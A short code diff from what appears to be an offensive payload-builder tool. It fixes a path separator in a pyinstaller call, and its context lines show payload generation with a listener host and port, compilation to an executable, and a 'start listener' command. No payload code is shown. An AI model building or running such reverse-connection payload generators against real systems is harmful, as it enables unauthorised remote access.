@@ -71,7 +71,7 @@ while True:
         exe = input('Do you want to compile the payload into an exe? (y/N) ')
         generatePayload(payload,lhost,lport)
         if exe.lower()=='y':
-            os.system('pyinstaller --onefile Payloads\Generated\payload.pyw')
+            os.system('pyinstaller --onefile Payloads/Generated/payload.pyw')
             os.system('COPY "dist/payload.exe" "Payloads/Generated"')
     #TODO ADD MORE LISTENERS
     elif cmd.startswith('start listener ') :
